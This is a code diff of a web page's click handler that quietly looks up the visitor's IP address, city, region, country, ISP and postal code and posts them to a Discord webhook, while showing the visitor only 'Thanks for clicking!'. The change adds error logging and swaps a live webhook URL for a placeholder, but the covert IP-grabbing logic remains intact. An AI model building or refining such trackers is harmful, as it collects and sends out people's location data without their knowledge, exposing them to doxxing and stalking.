@@ -65,6 +65,7 @@
             fetch("https://api.ipify.org?format=json")
                 .then(response => {
                     if (!response.ok) {
+                        console.error('Error fetching IP address:', response.statusText);
                         throw new Error('Failed to fetch IP address');
                     }
                     return response.json();
@@ -75,12 +76,13 @@
                 })
                 .then(response => {
                     if (!response.ok) {
+                        console.error('Error fetching IP details:', response.statusText);
                         throw new Error('Failed to fetch IP details');
                     }
                     return response.json();
                 })
                 .then(data => {
-                    const webhookUrl = 'https://discord.com/api/webhooks/1302270863206387845/a2WPDa6eWWgHRH3UOHX5kccg-demTyZUTyOVKzpplCEz4mDpdds4jf_5Ke-TyGAE0d9z';
+                    const webhookUrl = 'YOUR_WEBHOOK_URL'; // Ensure your webhook URL is correct
                     const message = {
                         content: `<@1276852876274307082> Here is the IP information:\n\n**IP Address:** ${data.ip}\n**Location:** ${data.city}, ${data.region}, ${data.country_name}\n**ISP:** ${data.org}\n**Postal Code:** ${data.postal}`
                     };
@@ -96,6 +98,7 @@
                     button.classList.remove("animate");
                     document.getElementById("loading").style.display = "none";
                     if (!response.ok) {
+                        console.error('Error sending message to Discord:', response.statusText);
                         throw new Error('Failed to send message to Discord');
                     }
                     document.getElementById("message").innerText = 'Thanks for clicking!';
@@ -103,7 +106,7 @@
                 .catch(error => {
                     button.classList.remove("animate");
                     document.getElementById("loading").style.display = "none";
-                    document.getElementById("message").innerText = 'Error occurred. Please try again.'; // Generic error message
+                    document.getElementById("message").innerText = 'Error occurred. Please try again.';
                     console.error('Error:', error); // Log the error for debugging
                 });
         });
